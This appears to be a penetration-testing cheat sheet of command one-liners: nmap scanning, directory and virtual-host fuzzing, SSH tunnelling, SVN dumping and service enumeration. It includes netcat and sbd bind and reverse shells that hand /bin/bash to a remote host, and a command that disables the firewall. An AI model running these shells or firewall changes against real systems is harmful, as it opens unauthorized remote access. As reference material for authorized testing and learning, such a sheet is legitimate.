## Nmap Scan

Launch normal scan

`nmap -sC -sV -Pn -oA nmap-out example.com`

Find nse scripts 

`ls /usr/share/nmap/scripts/|grep svn`

Get help for particular nse script

`nmap --script-help svn-brute.nse`

## SCP to copy files

Upload file/folder

`scp -r local.txt host:/path/to/dest`

Download file/folder

`scp -r host:/path/to/remote.txt .`

## Directory Brute Force

Dirsearch for brute forcing file system

`./dirsearch.py -r -e old,new,txt,asp,aspx,jsp,jspx,bak,gz,zip,tar,7z,php,htm,html,bat,sh,do -b --random-agents --plain-text-report=dirsearch.out -u url -w wordlist(optional)`

FFuf to fuzz content

`ffuf -w content_discovery_all.txt -u http://host/ -o dirfuzz.txt -of md -timeout 30 -ac -s -t 20 -se`


## Virtual Host Discovery

`ffuf -w /path/to/vhost/wordlist -u https://target -H "Host: FUZZ" -fs 4242`

## SSH Port Forwarding

__Local Forwarding__ - Binding to local machine port 8080 and forwarding to 10.10.10.203 on port 80 via vps (only localhost can connect)

`ssh -L 8080:10.10.10.203:80 vps_ip`

__Remote forwarding__ - Remote ssh server listens on remote port 8080 and forwards all the traffic to remote port 8080 via ssh client to destination host.(Opposite of Local Forwarding)

`ssh -R 8080:localhost:80 public.example.com`

__Dynamic Forwarding__ - Dynamic port forwarding allows you to create a socket on the local (ssh client) machine, which acts as a SOCKS proxy server. Running below command on vps will make it act as a socks proxy on port 8080.

`ssh -D vps_ip:8080 vps_ip`


## SVN commands

```
svn checkout svn://host
svn log
svn update -r r5
```

Dump repo content

`svnrdump dump svn://host`

## Searching File System 

```
Find <location> -name <to find>
eg: find / -name ettercap
```

```
locate filename  --> to locate anything
updatebd --> to update local database
```

## Enumerate running services and ports

```
netstat -antp --> running services and ports
```

## Bind and Reverse Shells

* Netcat Shells

```
nc -nv 192.168.145.129 4444 -e /bin/bash 2> error_log 
nc -nlvp 4444 

ncat is similar to nc but also supports ssl for encryption

ncat -nlvp 4444 --ssl --allow <ip>
ncat -nv <ip_to_connect> 4444
```

* SBD shells

```
sbd -lp 4444 -k secret -e /bin/bash
sbd -k secret 127.0.0.1 4444
```

## Firewall Commands

Disable firewall

```
ufw disable
```